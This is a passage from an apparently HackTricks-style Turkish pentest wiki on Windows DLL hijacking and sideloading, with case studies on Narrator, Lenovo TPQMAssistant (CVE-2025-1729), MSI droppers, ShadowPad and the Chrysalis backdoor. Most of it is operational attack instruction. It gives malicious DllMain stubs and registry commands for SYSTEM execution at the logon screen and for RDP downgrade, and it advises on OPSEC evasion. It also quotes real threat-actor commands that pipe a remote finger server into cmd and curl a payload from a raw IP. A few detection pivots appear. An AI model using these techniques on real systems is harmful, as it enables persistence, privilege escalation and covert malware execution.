BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka Çalışması: Narrator OneCore TTS Localization DLL Hijack (Erişilebilirlik/AT'ler)

Windows Narrator.exe, başlangıçta ele geçirilebilen ve arbitrary code execution ile persistence için kullanılabilen, öngörülebilir ve dile özgü bir localization DLL dosyasını hâlâ arar.<sup>[[7]](#references)</sup>

Temel bilgiler
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path üzerinde writable ve attacker-controlled bir DLL mevcutsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Herhangi bir export gerekli değildir.

Procmon ile Discovery
- Filter: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path için gerçekleştirilen load girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- Naif bir hijack konuşur/UI'yi vurgular. Sessiz kalmak için attach sırasında Narrator thread'lerini enumerate edin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açın ve `SuspendThread` uygulayın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility configuration üzerinden tetikleme ve persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilen DLL yüklenir. Secure desktop'ta (logon screen), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'niz secure desktop üzerinde SYSTEM olarak çalışır.

RDP tetiklemeli SYSTEM execution (lateral movement)
- Classic RDP security layer'ı etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, logon screen'de Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'niz secure desktop üzerinde SYSTEM olarak çalışır.
- RDP session kapandığında execution durur—hızlıca inject/migrate edin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool'un (AT) registry entry'sini (ör. CursorIndicator) clone edebilir, arbitrary bir binary/DLL'ye işaret edecek şekilde düzenleyebilir, import edebilir ve ardından `configuration` değerini bu AT name olarak ayarlayabilirsiniz. Bu yöntem, Accessibility framework altında arbitrary execution için proxy görevi görür.

Notlar
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek admin rights gerektirir.
- Tüm payload logic'i `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Case Study: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation

Bu case, Lenovo'nun TrackPoint Quick Menu'sunda (`TPQMAssistant.exe`) **Phantom DLL Hijacking** tekniğini ve **CVE-2025-1729** olarak takip edilen açığı gösterir.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumunda bulunan `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün saat 9:30'da logon olan user context altında çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir; bu da local user'ların arbitrary file bırakmasına olanak tanır.
- **DLL Search Behavior**: Önce working directory'den `hostfxr.dll` yüklemeyi dener ve DLL bulunamadığında "NAME NOT FOUND" log'lar; bu durum local directory search precedence'ını gösterir.

### Exploit Implementation

Bir attacker, aynı directory'ye malicious bir `hostfxr.dll` stub yerleştirerek eksik DLL'den yararlanabilir ve user context altında code execution elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Scheduled task'ın saat 9:30'da mevcut kullanıcının context'i altında çalışmasını bekleyin.
3. Task çalıştığında bir administrator oturum açmışsa, malicious DLL administrator'ın session'ında medium integrity ile çalışır.
4. Medium integrity'den SYSTEM privileges seviyesine yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Case Study: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) Üzerinden DLL Side-Loading

Threat actor'lar payload'ları trusted ve signed bir process altında çalıştırmak için MSI tabanlı dropper'ları sıklıkla DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincir genel görünümü
- User MSI'ı indirir. GUI install sırasında bir CustomAction (ör. LaunchApplication veya bir VBScript action) sessizce çalışır ve bir sonraki stage'i embedded resources'tan yeniden oluşturur.
- Dropper, legitimate ve signed bir EXE ile malicious bir DLL'i aynı dizine yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Signed EXE başlatıldığında Windows DLL search order, önce working directory'deki wsc.dll'i yükler ve attacker code'u signed bir parent altında çalıştırır (ATT&CK T1574.001).

MSI analizi (aranacaklar)
- CustomAction tablosu:
- Executable veya VBScript çalıştıran entry'leri arayın. Şüpheli pattern örneği: background'da embedded bir dosyayı çalıştıran LaunchApplication.
- Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki embedded/split payload'lar:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- VBScript CustomAction tarafından birleştirilen ve decrypt edilen birden fazla küçük fragment arayın. Yaygın flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Pratik sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: legitimate signed host (Avast). İşlem, wsc.dll dosyasını kendi dizininden ada göre yüklemeye çalışır.
- wsc.dll: attacker DLL. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturun ve payload'u DllMain içinde çalıştırırken gerekli export'ları genuine library'ye forward edin.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için bir proxying framework (ör. DLLirant/Spartacus) kullanarak payload'unuzu da çalıştıran bir forwarding DLL oluşturun.

- Bu teknik, DLL name resolution işleminin host binary tarafından yapılmasına dayanır. Host absolute path veya safe loading flag'leri (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export'lar öncelik sırasını etkileyebilir; host binary ve export set seçilirken bunlar dikkate alınmalıdır.

## İmzalı triad'lar + encrypted payload'lar (ShadowPad case study)

Check Point, Ink Dragon'un disk üzerindeki core payload'u encrypted durumda tutarken legitimate software ile uyum sağlamak için ShadowPad'i **üç dosyalı bir triad** kullanarak dağıttığını açıkladı:<sup>[[12]](#references)</sup>

1. **İmzalı host EXE** – AMD, Realtek veya NVIDIA gibi vendor'ların dosyaları kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable'ı bir Windows binary'si gibi görünmesi için yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerliliğini korur.
2. **Malicious loader DLL** – EXE'nin yanına beklenen adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework'ü ile obfuscate edilmiş bir MFC binary'sidir; tek görevi encrypted blob'u bulmak, decrypt etmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – çoğunlukla aynı directory içinde `<name>.tmp` olarak saklanır. Decrypted payload memory-map edildikten sonra loader, forensic evidence'ı yok etmek için TMP file'ını siler.

Tradecraft notları:

* İmzalı EXE'yi yeniden adlandırmak (PE header içindeki özgün `OriginalFileName` korunurken), vendor signature'ını koruyarak Windows binary'si gibi görünmesini sağlar. Bu nedenle Ink Dragon'un, gerçekte AMD/NVIDIA utility'leri olan `conhost.exe` görünümlü binary'ler bırakma alışkanlığı taklit edilmelidir.
* Executable trusted kalmaya devam ettiğinden, çoğu allowlisting kontrolünde yalnızca malicious DLL'nin yanına yerleştirilmesi gerekir. Loader DLL'yi özelleştirmeye odaklanın; signed parent genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad decryptor'ı TMP blob'un loader'ın yanında bulunmasını ve writable olmasını bekler; böylece mapping sonrasında file'ı zero'layabilir. Payload yüklenene kadar directory'yi writable tutun; memory'ye alındıktan sonra TMP file'ı OPSEC amacıyla güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operator'ler, disk üzerindeki tek custom artifact'in trusted EXE'nin yanındaki malicious DLL olması için DLL sideloading'i LOLBAS ile birleştirir:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell, `cmd.exe /c` başlatır, Finger server'dan command'ları çeker ve bunları `cmd`'ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`, TCP/79 text'ini çeker; `| cmd` server response'unu çalıştırır ve operator'lerin second stage server'ını server-side değiştirmesine olanak tanır.

- **Built-in download/extract:** Benign bir extension'a sahip archive'ı indirin, unpack edin ve sideload target ile DLL'yi rastgele bir `%LocalAppData%` folder'ı altında stage edin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress'i gizler ve redirect'leri takip eder; `tar -xf`, Windows'un built-in tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI üzerinden başlatın; böylece telemetry, colocated DLL'yi yüklerken CIM tarafından oluşturulmuş bir process gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL'leri tercih eden binary'lerle (ör. `intelbq.exe`, `nearby_share.exe`) çalışır; payload (ör. Remcos), trusted name altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` parametrelerinin birlikte göründüğü `forfiles` kullanımlarını alert'leyin; admin script'leri dışında yaygın değildir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion'ında, bir NSIS-packed dropper teslim etmek için trusted update chain kötüye kullanıldı; bu dropper bir DLL sideload ile tamamen in-memory payload'ları stage etti.<sup>[[13]](#references)</sup>

Tradecraft akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`'yi, malicious `log.dll`'yi ve encrypted `BluetoothService` blob'unu bırakır, ardından EXE'yi başlatır.
- Host EXE, `log.dll` import eder ve `LogInit`/`LogWrite` çağırır. `LogInit`, blob'u mmap-load eder; `LogWrite`, blob'u custom LCG-based stream ile decrypt eder (constant'lar **0x19660D** / **0x3C6EF35F**, key material önceki bir hash'ten türetilir), buffer'ı plaintext shellcode ile overwrite eder, temporary verileri free eder ve shellcode'a atlar.
- IAT kullanmamak için loader, export name'lerini **FNV-1a basis 0x811C9DC5 + prime 0x100019** kullanarak hash'ler; ardından Murmur-style avalanche (**0x85EBCA6B**) uygular ve salted target hash'leriyle karşılaştırır.

Main shellcode (Chrysalis)
- Beş pass boyunca `gQ2JR&9;` key'iyle tekrarlanan add/XOR/sub işlemleri kullanarak PE-like main module'ü decrypt eder, ardından import resolution'ı tamamlamak için `Kernel32.dll` → `GetProcAddress` dinamik olarak yükler.
- DLL name string'lerini runtime sırasında per-character bit-rotate/XOR transform'larıyla yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- İkinci bir resolver, **PEB → InMemoryOrderModuleList** yolunu izler, her export table'ını Murmur-style mixing ile 4-byte block'lar halinde parse eder ve yalnızca hash bulunamazsa `GetProcAddress`'e fallback eder.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` file'ının içinde **offset 0x30808**'de (**size 0x980**) bulunur ve `qwhvb^435h&*7` key'iyle RC4-decrypt edilir; bunun sonucunda C2 URL'si ve User-Agent açığa çıkar.
- Beacon'lar dot-delimited bir host profile oluşturur, başına `4Q` tag'ini ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısından önce `vAuig34%^325hGV` key'iyle RC4-encrypt eder. Response'lar RC4-decrypt edilir ve bir tag switch ile dispatch edilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode CLI arg'larıyla kontrol edilir: argüman yoksa `-i`'yi işaret eden persistence (service/Run key) kurulur; `-i`, `-k` ile kendini yeniden başlatır; `-k`, install'ı atlar ve payload'u çalıştırır.

Alternate loader observed
- Aynı intrusion, Tiny C Compiler'ı bıraktı ve `C:\ProgramData\USOShared\` içinden `svchost.exe -nostdlib -run conf.c` çalıştırdı; `libtcc.dll` de yanındaydı. Saldırgan tarafından sağlanan C source, shellcode'u embedded etti, compile etti ve PE'yi diske yazmadan memory'de çalıştırdı. Şununla replicate edin:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- TCC tabanlı bu derleme ve çalıştırma aşaması, çalışma zamanında `Wininet.dll` içe aktardı ve sabit kodlanmış bir URL'den ikinci aşama shellcode'unu çekti; böylece derleyici çalıştırması gibi görünen esnek bir loader sağladı.

## Export proxying + host thread parking ile imzalı host sideloading

Bazı DLL sideloading zincirleri, meşru host'un kötü amaçlı DLL yüklendikten sonra çökmesi yerine sonraki aşamaları düzgün şekilde yükleyecek kadar uzun süre çalışır durumda kalmasını sağlamak için **stability engineering** teknikleri ekler.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Beklenen `version.dll` gibi bağımlılık adını kullanarak güvenilir bir EXE'yi kötü amaçlı bir DLL'nin yanına bırakın.
- Kötü amaçlı DLL, import çözümlemesinin başarılı olması ve host işleminin çalışmaya devam etmesi için **her beklenen export'u** gerçek sistem DLL'sine (örneğin `%SystemRoot%\\System32\\version.dll`) proxy'ler.
- Yüklendikten sonra kötü amaçlı DLL, ana thread'in çıkmak veya işlemi sonlandıracak kod yollarını çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girmesi için **host entry point'ini patch'ler**.
- Yeni bir thread gerçek kötü amaçlı işi gerçekleştirir: sonraki aşama DLL'sinin adını veya yolunu çözer (`RC4/XOR` yaygındır), ardından `LoadLibrary` ile çalıştırır.

Bunun önemi
- Normal DLL proxying, API uyumluluğunu korur; ancak sonraki aşamaların yeterince uzun süre çalışması için host'un hayatta kalacağını garanti etmez.
- Ana thread'i `Sleep(INFINITE)` içinde bekletmek, loader başka bir worker thread'de decryption, staging veya network bootstrap gerçekleştirirken imzalı işlemi bellekte tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak bu örüntüyü gözden kaçırabilir; ilgi çekici davranış host entry point'i patch'lenip ikincil bir thread başlatıldıktan sonra gerçekleşebilir.

Minimal workflow
1. İmzalı host EXE'yi kopyalayın ve yerel dizinden çözdüğü DLL'yi belirleyin.
2. Aynı işlevleri export eden ve bunları meşru DLL'ye forward eden bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread'den, `Sleep` üzerinde döngü oluşturması için host entry point'ini veya ana thread başlangıç rutinini patch'leyin.
5. Sonraki aşama DLL'sinin adını/config bilgisini decrypt edin ve `LoadLibrary` çağırın veya payload'u manual-map edin.

Defensive pivots
- `version.dll` veya benzer yaygın kütüphaneleri `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı işlemler.
- Image load'dan kısa süre sonra process entry point'te gerçekleşen memory patch'leri; özellikle `Sleep`/`SleepEx`'e yönlendirilen jump/call'lar.
- Bir proxy DLL tarafından oluşturulan ve hemen decrypted bir adla ikinci bir DLL üzerinde `LoadLibrary` çağıran thread'ler.
- `ProgramData`, `%TEMP%` veya unpack edilmiş arşiv yolları gibi yazılabilir staging dizinlerinde vendor executable'larının yanına yerleştirilen full-export proxy DLL'leri.

## References

- [1] [Red Canary – Intelligence Insights: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Avrupa'yı Hedefleyen Yeni Malware Deploy Ediyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Helpers ile Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT Dağıtan Gelişen Impersonation Campaigns'in Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Güneydoğu Asya'daki Bir Hükümeti Hedefleyen Threat Clusters Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network'ü ve Stealthy Offensive Operation'ın İç İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom'un toolkit'ine Derinlemesine Bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens'in 2026 Espionage Campaigns'ini Tracking](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict Sırasında Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya Hükümetlerini ve Critical Infrastructure'ı Hedefliyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
